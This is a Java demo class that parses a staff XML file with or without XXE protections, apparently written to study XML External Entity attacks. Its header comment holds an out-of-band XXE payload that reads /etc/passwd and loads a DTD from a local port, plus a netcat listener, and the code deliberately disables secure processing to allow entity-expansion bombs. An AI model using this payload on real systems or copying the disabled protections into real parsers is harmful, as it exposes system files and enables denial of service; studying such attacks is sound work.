package xxe;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.File;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

/**
 * netcat -l -p 8889
 *
 * file:///Users/rtsypuk/projects/personal/interview/target/classes/staff_safari.xml
 *
 * <?xml version="1.0"?>
 * <!DOCTYPE gpx [
 * <!ENTITY % file SYSTEM "file:///etc/passwd">
 * <!ENTITY % dtd SYSTEM "http://127.0.0.1:8888">
 * %dtd;]>
 * <company>
 * <staff id="1001">
 * <firstname>yong</firstname>
 * <lastname>mook kim</lastname>
 * <nickname>mkyong</nickname>
 * <salary>100000</salary>
 * </staff>
 * <staff id="2001">
 * <firstname>low</firstname>
 * <lastname>yin fong</lastname>
 * <nickname>fong fong</nickname>
 * <salary>200000</salary>
 * </staff>
 * </company>
 *
 * lighttpd -f /usr/local/etc/lighttpd/lighttpd.conf
 * 2016-11-23 17:56:31: (network.c.410) can't bind to port:  8080 Address already in use
 *
 * lsof -w -n -i tcp:8080
 *
 * COMMAND    PID    USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
 * lighttpd  91277 ---       4u  IPv4 0x88f6a560049c99db      0t0  TCP *:http-alt (LISTEN)
 * kill -9 91277
 */
public class SimpsonXmlReader {

    private boolean secured;

    public SimpsonXmlReader(boolean secured) {
        this.secured = secured;
    }

    public void loadXml(String fileName) {
        try {

            ClassLoader classLoader = getClass().getClassLoader();
            File xmlFile = new File(classLoader.getResource(fileName).getFile());
            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
            increaseAccumulatedSize(dbFactory);

            if (secured) {
                secureDocumentBuilder(dbFactory);
            }

            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
            Document doc = dBuilder.parse(xmlFile);
            doc.getDocumentElement().normalize();

            System.out.println("Root element :" + doc.getDocumentElement().getNodeName());

            NodeList nList = doc.getElementsByTagName("staff");

            System.out.println("----------------------------");

            for (int temp = 0; temp < nList.getLength(); temp++) {

                Node nNode = nList.item(temp);

                System.out.println("\nCurrent Element :" + nNode.getNodeName());

                if (nNode.getNodeType() == Node.ELEMENT_NODE) {

                    Element eElement = (Element) nNode;

                    System.out.println("Staff id : " + eElement.getAttribute("id"));
                    System.out.println("First Name : " + eElement.getElementsByTagName("firstname").item(0)
                            .getTextContent());
                    System.out.println("Last Name : " + eElement.getElementsByTagName("lastname").item(0)
                            .getTextContent());
                    System.out.println("Nick Name : " + eElement.getElementsByTagName("nickname").item(0)
                            .getTextContent());
                    System.out.println("Salary : " + eElement.getElementsByTagName("salary").item(0)
                            .getTextContent());
                    System.out.println("Password : " + eElement.getElementsByTagName("password").item(0)
                            .getTextContent());

                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Applies features that allow or deny the DTD interpretation, external entities processing and others...
     *
     * @param dbFactory the instance of DocumentBuilderFactory thats features will be set up.
     */
    private void secureDocumentBuilder(DocumentBuilderFactory dbFactory) throws ParserConfigurationException {

/**
 * We do not allow external entities processing by setting up these flags:
 */
        dbFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

/**
 * XML Entity Expansion Injection (XML Bomb)
 */
        dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    }

    private void increaseAccumulatedSize(DocumentBuilderFactory dbFactory) throws ParserConfigurationException {
        /**
         * [Fatal Error] :1:1: JAXP00010001:
         * The parser has encountered more than "64000" entity expansions in this document;
         * this is the limit imposed by the JDK (jdk8). To emulate jdk7 or earlier we use:
         * -Xms64m -Xmx2048m -Djdk.xml.entityExpansionLimit=0
         *
         * We need TURN ON this feature to emulate previous version java where
         * [Fatal Error] :1:8: JAXP00010004:
         * The accumulated size of entities is "50,000,006" that exceeded the "50,000,000" limit set by
         * "FEATURE_SECURE_PROCESSING".
         * https://blogs.oracle.com/joew/entry/jdk_7u45_aws_issue_123
         */
        dbFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
    }
}